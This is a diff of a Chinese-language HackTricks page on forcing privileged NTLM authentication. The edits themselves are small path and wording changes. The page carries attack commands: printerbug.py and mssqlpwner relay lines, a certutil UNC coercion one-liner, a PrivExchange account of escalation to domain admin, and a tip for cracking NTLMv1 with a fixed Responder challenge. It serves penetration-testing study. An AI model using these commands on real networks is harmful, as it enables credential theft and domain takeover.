@@ -1,16 +1,16 @@
 # 强制 NTLM 特权认证
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
@@ -62,13 +62,13 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ## PrivExchange
 
-`PrivExchange`攻击是由于在**Exchange Server `PushSubscription`功能**中发现的缺陷。此功能允许任何具有邮箱的域用户强制Exchange服务器通过HTTP对任何客户端提供的主机进行身份验证。
+`PrivExchange`攻击是由于**Exchange Server `PushSubscription`功能**中的一个缺陷所导致的。该功能允许任何具有邮箱的域用户强制Exchange服务器通过HTTP对任何客户端提供的主机进行身份验证。
 
-默认情况下，**Exchange服务以SYSTEM身份运行**，并被赋予过多的权限（具体来说，它在2019年之前的累积更新上具有**WriteDacl权限**）。此缺陷可以被利用以启用**向LDAP中转信息并随后提取域NTDS数据库**。在无法向LDAP中转的情况下，此缺陷仍可用于在域内中转和对其他主机进行身份验证。成功利用此攻击将立即授予任何经过身份验证的域用户帐户对域管理员的访问权限。
+默认情况下，**Exchange服务以SYSTEM身份运行**，并被赋予过多的权限（具体来说，它在2019年之前的累积更新上具有**WriteDacl权限**）。这个缺陷可以被利用来启用**向LDAP中转信息并随后提取域NTDS数据库**。在无法向LDAP中转的情况下，这个缺陷仍然可以用于在域内中转和对其他主机进行身份验证。成功利用此攻击将立即授予任何经过身份验证的域用户帐户对域管理员的访问权限。
 
 ## 在Windows内部
 
-如果您已经在Windows机器内部，可以使用以下方法强制Windows使用特权帐户连接到服务器：
+如果您已经在Windows机器内部，可以使用以下命令强制Windows使用特权帐户连接到服务器：
 
 ### Defender MpCmdRun
 ```bash
@@ -93,7 +93,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.25
 
 ### Certutil
 
-可以使用 certutil.exe lolbin（微软签名的二进制文件）来强制 NTLM 认证：
+可以使用 certutil.exe lolbin（微软签名的二进制文件）来强制 NTLM 认证:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -116,18 +116,18 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ## 破解 NTLMv1
 
 如果你能捕获 [NTLMv1 挑战，请阅读如何破解它们](../ntlm/#ntlmv1-attack)。\
-_请记住，为了破解 NTLMv1，你需要将 Responder 挑战设置为 "1122334455667788"_
+&#xNAN;_&#x52;记住，为了破解 NTLMv1，你需要将 Responder 挑战设置为 "1122334455667788"_
 
 {% hint style="success" %}
-学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
